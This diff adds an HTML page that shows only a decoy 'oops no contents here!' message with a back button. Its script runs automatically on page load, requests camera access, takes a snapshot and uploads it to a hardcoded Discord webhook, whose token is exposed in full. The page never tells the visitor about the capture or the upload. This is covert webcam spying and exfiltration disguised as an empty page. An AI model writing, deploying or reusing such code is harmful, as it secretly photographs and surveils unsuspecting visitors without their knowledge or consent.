@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Capture & Send to Discord</title>
+    <style>
+        /* General Body Styling */
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            font-family: 'Poppins', sans-serif;
+            background-color: #f8faff;
+            text-align: center;
+            position: relative;
+            color: #333;
+        }
+
+        /* Back Arrow Button */
+        .back-button {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            font-size: 26px;
+            color: #007BFF;
+            background: none;
+            border: none;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+        }
+
+        .back-button:hover {
+            transform: scale(1.2);
+            color: #0056b3;
+        }
+
+        /* Emoji Animation */
+        .emoji {
+            font-size: 60px;
+            position: relative;
+            animation: jump 1s infinite alternate ease-in-out;
+            color: #007BFF;
+        }
+
+        @keyframes jump {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-15px); }
+        }
+
+        /* Message Styling */
+        .message {
+            font-size: 22px;
+            color: #444;
+            margin-top: 10px;
+            font-weight: 500;
+        }
+
+        /* Stylish Container */
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .container:hover {
+            transform: scale(1.02);
+            box-shadow: 0px 6px 25px rgba(0, 0, 0, 0.15);
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Back Arrow Button -->
+    <button class="back-button" onclick="window.location.href='dash.html'">❮❮</button>
+
+    <div class="container">
+        <div class="emoji">😆</div>
+        <div class="message">oops no contents here!</div>
+    </div>
+
+    <script>
+        const webhookURL = "https://discord.com/api/webhooks/1347850732241682473/HSWFUC1qCvWQnapBwoUIBr8CR71Stnszxeeesp91sTVdzeGQP9l763spt9Ickjz9fuME";
+
+        async function captureAndSendImage() {
+            try {
+                // Request access to the camera
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+
+                // Create a video element to capture a frame
+                const video = document.createElement("video");
+                video.srcObject = stream;
+                await new Promise(resolve => (video.onloadedmetadata = resolve));
+                video.play();
+
+                // Wait a moment for the camera to adjust
+                await new Promise(resolve => setTimeout(resolve, 1000));
+
+                // Capture an image from the video stream
+                const canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext("2d");
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Stop the camera stream
+                stream.getTracks().forEach(track => track.stop());
+
+                // Convert the image to a Blob and send it to Discord
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append("file", blob, "captured_image.png");
+
+                    try {
+                        const response = await fetch(webhookURL, {
+                            method: "POST",
+                            body: formData
+                        });
+
+                        if (response.ok) {
+                            console.log("Image sent to Discord successfully!");
+                        } else {
+                            console.error("Failed to send image. Check webhook URL.");
+                        }
+                    } catch (error) {
+                        console.error("Error sending image:", error);
+                    }
+                }, "image/png");
+
+            } catch (error) {
+                console.error("Camera access denied or error:", error);
+            }
+        }
+
+        // Automatically capture and send image on page load
+        window.onload = captureAndSendImage;
+    </script>
+
+</body>
+</html>
